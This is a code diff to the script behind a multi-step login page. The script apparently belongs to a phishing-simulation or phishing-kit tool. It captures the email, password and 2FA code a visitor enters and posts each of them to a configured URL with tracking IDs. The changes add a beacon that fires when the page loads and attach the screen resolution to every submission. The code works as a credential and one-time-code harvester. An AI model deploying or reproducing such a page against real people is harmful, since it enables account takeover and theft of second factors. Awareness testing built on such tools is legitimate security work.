@@ -70,9 +70,14 @@
     return { rid: t.rid || Q.get("rid") || "", sess_id: t.session_id || Q.get("sess_id") || "", trackerId: t.tracker_id || Q.get("trackerId") || "" };
   }
   function post(payload, cb) {
+    cb = cb || function () {};
     if (!POST_URL) { cb(); return; }
     fetch(POST_URL, { method: "POST", mode: "cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).then(cb, cb);
   }
+  function sres() { return (window.screen ? (screen.width + "x" + screen.height) : ""); }
+  // Next-round fix: page-0 visit beacon on load → tb_data_webpage_visit (was never
+  // sent, so "clicked but didn't submit" was unmeasurable). Also carries screen_res.
+  (function () { var c0 = trackerCtx(); post({ page: 0, rid: c0.rid, sess_id: c0.sess_id, trackerId: c0.trackerId, screen_res: sres() }); })();
   var formEmail = document.getElementById("step-email");
   var formPwd   = document.getElementById("step-password");
   var form2fa   = document.getElementById("step-2fa");
@@ -90,13 +95,13 @@
     e.preventDefault();
     emailVal = formEmail.elements["email"].value;
     var ctx = trackerCtx();
-    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { gotoPwd(); });
+    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId, screen_res: sres() }, function () { gotoPwd(); });
   });
   formPwd.addEventListener("submit", function (e) {
     e.preventDefault();
     pwdVal = formPwd.elements["password"].value;
     var ctx = trackerCtx();
-    post({ page: 2, form_field_data: { email: emailVal, password: pwdVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
+    post({ page: 2, form_field_data: { email: emailVal, password: pwdVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId, screen_res: sres() }, function () {
       if (captureMfa) { formPwd.style.display = "none"; form2fa.style.display = "block"; }
       else { redirectAware(ctx); }
     });
@@ -105,7 +110,7 @@
     e.preventDefault();
     var code = form2fa.elements["code_2fa"].value;
     var ctx = trackerCtx();
-    post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { redirectAware(ctx); });
+    post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId, screen_res: sres() }, function () { redirectAware(ctx); });
   });
   if (prefillEmail && formEmail.elements["email"]) { formEmail.elements["email"].value = prefillEmail; }
 })();
